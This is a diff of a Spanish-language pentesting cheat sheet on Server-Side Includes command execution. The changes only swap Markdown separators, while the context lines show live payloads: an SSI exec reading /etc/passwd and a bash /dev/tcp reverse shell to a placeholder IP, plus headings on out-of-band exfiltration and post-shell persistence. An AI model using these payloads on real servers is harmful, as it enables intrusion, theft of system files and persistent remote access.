@@ -17,7 +17,7 @@ linked:
 ---
 # SSI - Ejecución de Comandos
 
-***
+---
 
 ## RCE Linux / Windows Básico
 
@@ -38,7 +38,7 @@ linked:
 | Verbose output | `<!--#exec cmd="ls -la /; cat /etc/passwd" -->` | Multi-line. |
 ^ssi-exec-basic
 
-___
+---
 
 ## Reverse Shells
 
@@ -58,7 +58,7 @@ ___
 | Persistencia post-shell | Add SSH key, cron, service | Post-RCE. |
 ^ssi-exec-revshell
 
-___
+---
 
 ## OOB Exfil (Blind RCE)
 
@@ -101,7 +101,7 @@ echo "<base64>" | base64 -d
 PAYLOAD='<!--#exec cmd="bash -c \"bash -i >& /dev/tcp/<IP>/4444 0>&1\"" -->'
 ```
 
-___
+---
 
 ## Requisitos para que `#exec` Funcione
 
@@ -119,4 +119,4 @@ ___
 | IIS configuration | SSI via handler mappings | IIS-specific. |
 ^ssi-exec-requirements
 
-***
+---
